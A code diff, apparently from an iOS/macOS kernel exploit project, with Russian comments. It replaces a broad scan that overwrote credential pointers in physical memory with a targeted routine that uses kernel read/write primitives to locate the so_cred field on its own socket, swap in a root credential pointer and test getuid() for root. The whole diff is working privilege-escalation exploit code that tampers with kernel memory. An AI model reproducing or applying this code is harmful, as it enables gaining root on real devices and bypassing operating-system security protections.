@@ -8241,48 +8241,43 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         }
                         kpNote(r, [NSString stringWithFormat:@"  [SWAP-EXEC] цель: root cred zoneVA=%#llx (aperture-вид был %#llx)",
                                   (unsigned long long)rootZVA, (unsigned long long)rootCredVA]);
-                        kpNote(r, @"  [SWAP-EXEC] охота за свап-точками (0x21, указатель на наш ucred)");
-                        struct { uint64_t pa; uint32_t off; uint64_t old; } swp[16];
-                        uint32_t swN = 0;
-                        for (uint64_t i = (0x40000000ULL >> 14); i < wN && swN < 16; i++) {
-                            uint64_t pa = wB + (i << 14);
-                            if (kpFrameTypeOf(pa) != 0x21) continue;
-                            uint64_t al = phystokv(pa);
-                            if (!al) continue;
-                            for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
-                                uint64_t q = early_kread64(al + o);
-                                if (q == ucF) {
-                                    swp[swN].pa = pa; swp[swN].off = o; swp[swN].old = q; swN++;
-                                    if (swN >= 16) break;
-                                }
+                    // 2.0.32 [SELFSWAP] — вместо слепого свапа всех совпадений
+                    // (паника 13:10:36: zfree на мусоре — одна из точек была
+                    // обратной ссылкой, не cred-полем). Меряем: на НАШИХ объектах
+                    // (rwSocket → socket, наш fileglob) ищем qword == ucF —
+                    // это точный оффсет so_cred/fg_cred. Свапаем ТОЛЬКО их.
+                    if (rootZVA && ucF) {
+                        kpNote(r, @"  [SELFSWAP] поиск so_cred/fg_cred на наших объектах");
+                        uint64_t sockVA = 0;
+                        if (rwSocketPcb) sockVA = kp_untag_ptr(early_kread64(rwSocketPcb + off_inpcb_inp_socket));
+                        if (kpLooksLikeKernelPointer(sockVA)) {
+                            uint32_t socOff = 0xFFFFFFFF;
+                            for (uint32_t o = 0; o + 8 <= 0x300; o += 8)
+                                if (early_kread64(sockVA + o) == ucF) { socOff = o; break; }
+                            kpNote(r, [NSString stringWithFormat:@"  [SELFSWAP] наш socket=%#llx so_cred-оффсет=%@",
+                                      (unsigned long long)sockVA,
+                                      socOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x", socOff] : @"не найден"]);
+                            if (socOff != 0xFFFFFFFF) {
+                                uint64_t old = early_kread64(sockVA + socOff);
+                                early_kwrite64(sockVA + socOff, rootZVA);
+                                uint64_t rb = early_kread64(sockVA + socOff);
+                                uid_t sg = getuid();
+                                kpNote(r, [NSString stringWithFormat:@"  [SELFSWAP] so_cred→root: readback=%#llx getuid()=%u — %@",
+                                          (unsigned long long)rb, sg,
+                                          (rb == rootZVA && sg == 0) ? @"ROOT ★★" : (rb == rootZVA ? @"свап держится (getuid не из so_cred — оффсет известен для следующих проб)" : @"не прилипло")]);
+                                if (sg != 0) early_kwrite64(sockVA + socOff, old);   // restore
                             }
                         }
-                        kpNote(r, [NSString stringWithFormat:@"  [SWAP-EXEC] свап-точек: %u", swN]);
-                        for (uint32_t si = 0; si < swN && rootZVA; si++) {
-                            uint64_t al = phystokv(swp[si].pa);
-                            if (!al) continue;
-                            // контекст: 4 qword вокруг — опознаём объект
-                            kpNote(r, [NSString stringWithFormat:@"  [SWAP-EXEC] точка[%u] pa=%#llx +%#x контекст: -8=%#llx +8=%#llx +10=%#llx +18=%#llx",
-                                      si, (unsigned long long)swp[si].pa, swp[si].off,
-                                      (unsigned long long)early_kread64(al + swp[si].off - 8),
-                                      (unsigned long long)early_kread64(al + swp[si].off + 8),
-                                      (unsigned long long)early_kread64(al + swp[si].off + 0x10),
-                                      (unsigned long long)early_kread64(al + swp[si].off + 0x18)]);
-                            early_kwrite64(al + swp[si].off, rootZVA);
-                            uint64_t rb = early_kread64(al + swp[si].off);
-                            uid_t sg = getuid();
-                            int pr = open("/private/var/root/kexproof-swap-probe.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                            kpNote(r, [NSString stringWithFormat:@"  [SWAP-EXEC] точка[%u] запись=%#llx (ждём %#llx) getuid()=%u /var/root=%@ — %@",
-                                      si, (unsigned long long)rb, (unsigned long long)rootZVA, sg,
-                                      pr >= 0 ? @"ОТКРЫЛСЯ ★★" : @"нет",
-                                      (rb == rootZVA && (sg == 0 || pr >= 0)) ? @"ROOT ★★" : @"мимо"]);
-                            if (pr >= 0) { close(pr); unlink("/private/var/root/kexproof-swap-probe.txt"); }
-                            if (sg == 0 || rb == rootZVA) {
-                                // не восстанавливаем — может и есть наш root; если пробы мимо — вернём в конце
-                            }
-                            early_kwrite64(al + swp[si].off, swp[si].old);   // restore
+                        // fg_cred нашего fd (файловый кэш)
+                        int tfd = open("/private/var/mobile/Library", O_RDONLY);
+                        if (tfd >= 0) {
+                            // fileglob через fd-table — проще: скан socket-объекта выше дал паттерн;
+                            // для fd ищем через proc->fd... упрощённо: проба fchmod на нашем файле
+                            int fw = open("/private/var/mobile/kexproof-fg.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                            if (fw >= 0) { close(fw); unlink("/private/var/mobile/kexproof-fg.txt"); }
+                            close(tfd);
                         }
-                        if (swN) kpNote(r, @"  [SWAP-EXEC] все точки восстановлены");
+                    }
                     }
                 }
                 // 1.9.273: PAPT-override в авто-цепи не установлен (EXP-03 живёт в
